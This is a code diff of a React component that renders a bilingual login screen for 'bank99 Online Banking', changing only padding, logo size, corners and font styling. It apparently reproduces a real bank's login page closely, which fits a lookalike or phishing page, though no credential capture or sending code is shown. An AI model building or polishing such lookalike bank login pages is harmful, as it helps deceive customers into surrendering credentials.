@@ -12,8 +12,8 @@ const Bank99 = () => {
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#eceff4", borderBottom: "1px solid #e0e0e0" }}>
-        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
-          <img src={bank99Logo} alt="bank99" className="h-10 md:h-14" />
+          <div className="max-w-[1200px] mx-auto flex items-center px-4 py-1.5">
+            <img src={bank99Logo} alt="bank99" className="h-8 md:h-10" />
         </div>
       </header>
 
@@ -27,7 +27,7 @@ const Bank99 = () => {
           backgroundRepeat: "no-repeat",
         }}
       >
-        <div className="w-full max-w-[560px] rounded overflow-hidden">
+        <div className="w-full max-w-[560px] overflow-hidden">
           {/* Yellow header bar */}
           <div
             className="px-6 py-4 font-semibold text-2xl"
@@ -39,7 +39,7 @@ const Bank99 = () => {
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
             {/* Greeting */}
-            <p className="text-sm leading-snug" style={{ color: "#333" }}>
+            <p className="text-sm leading-snug font-semibold" style={{ color: "#333" }}>
               {lang === "de"
                 ? "Hallo beim Online Banking der bank99! :-)"
                 : "Welcome to bank99 Online Banking! :-)"}
@@ -50,7 +50,7 @@ const Bank99 = () => {
 
             {/* Label row */}
             <div className="flex items-center justify-between">
-              <span className="font-normal text-xs" style={{ color: "#999" }}>
+              <span className="font-normal text-sm" style={{ color: "#999" }}>
                 {lang === "de" ? "Benutzername" : "Username"}
               </span>
               <span className="text-sm">
@@ -76,7 +76,7 @@ const Bank99 = () => {
                 onChange={(e) => setUsername(e.target.value)}
                 onFocus={() => setIsFocused(true)}
                 onBlur={() => setIsFocused(false)}
-                className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
+                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors"
                 style={{
                   backgroundColor: "#fff",
                   borderColor: isFocused ? "#ffdc00" : "#999",
@@ -99,7 +99,7 @@ const Bank99 = () => {
 
             {/* Weiter button */}
             <button
-              className="w-full py-2.5 font-semibold rounded text-sm"
+              className="w-full py-2 font-semibold text-sm"
               style={{ backgroundColor: "#ffdc00", color: "#000" }}
             >
               {lang === "de" ? "Weiter" : "Continue"}
